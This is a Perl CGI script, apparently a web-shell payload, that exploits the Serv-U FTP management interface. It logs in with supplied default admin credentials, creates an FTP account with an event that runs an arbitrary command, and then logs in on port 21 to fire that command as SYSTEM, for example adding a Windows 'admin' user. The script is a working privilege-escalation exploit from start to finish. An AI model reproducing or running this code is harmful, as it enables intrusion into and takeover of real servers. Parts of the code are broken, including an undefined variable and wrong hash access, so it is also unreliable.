# payload.pl

use strict;
use warnings;
use MIME::Base64;
use JSON;
use IO::Socket::INET;
use CGI;

my $q = CGI->new;

sub main {
    my $z1 = $q->param('z1');
    unless ($z1) {
        print "[-] Missing parameter: z1";
        return;
    }

    my $json_pattern = eval { decode_json(decode_base64($z1)) };
    if ($@ || !defined $decode_json) {
        print "[-] Invalid JSON / Base64 data.\n";
        return;
    }

    my $ip = $json_pattern->{"ip"} // "127.0.0.1";
    my $port = $json_pattern{"port"} // 43958;
    my $user = $json_pattern{"user"} // "";
    my $pass = $json_pattern{"pass"} // "";
    my $cmd = $json_pattern{"cmd"} // "";

    my $backdoor_user = "some_user";
    my $backdoor_pass = "some_pass";

    my $output = "";

    my $socket = IO::Socket::INET->new(
        PeerAddr => $ip,
        PeerPort => $port,
        Proto => 'tcp',
        Timeout => 5
    );

    unless ($socket) {
        print "[-] Failed to connect to Serv-U management port. Port changed or service unavailable.\n";
        return;
    }

    $output .= "[+] Successfully connected to Serv-U management port...\n";

    # read banner
    <$socket>;

    print $socket "USER $user\r\n";
    <$socket>;

    print $socket "PASS $pass\r\n";
    my $response = <$socket>;

    if (!defined $response || ($response !~ /230/ && $response !~ /Logged in/)) {
        close($socket);
        print "[-] Login failed: Default administrative password has been changed.\n";
        return;
    }

    $output .= "[+] Successfully authenticated into Serv-U management interface!\n";

    print $socket "SUSER $user|$pass|Y|N\r\n";
    <$socket>;

    print $socket "SEVENT $user|0|0|$cmd\r\n";
    <$socket>;

    $output .= "[+] Malicious FTP account and Event trigger configured successfully.\n";
    close($socket);

    $output .= "[+] Attempting to log into standard FTP port to trigger the SYSTEM payload...\n";
    my $ftp_socket = IO::Socket::INET->new(
        PeerAddr => '127.0.0.1',
        PeerPort => 21,
        Proto    => 'tcp',
        Timeout  => 3
    );

    if ($ftp_socket) {
        <$ftp_socket>;
        print $ftp_socket "USER $backdoor_user\r\n";
        <$ftp_socket>;

        print $ftp_socket "PASS $backdoor_pass\r\n";
        <$ftp_socket>;

        print $ftp_socket "QUIT\r\n";
        close($ftp_socket);

        $output .= "[+] Payload triggered! Verify if the Windows user 'admin' was added.\n";
    } else {
        $output .= "[-] Could not connect to port 21. The event will trigger whenever the account is accessed.\n";
    }

    print $output;
}

main();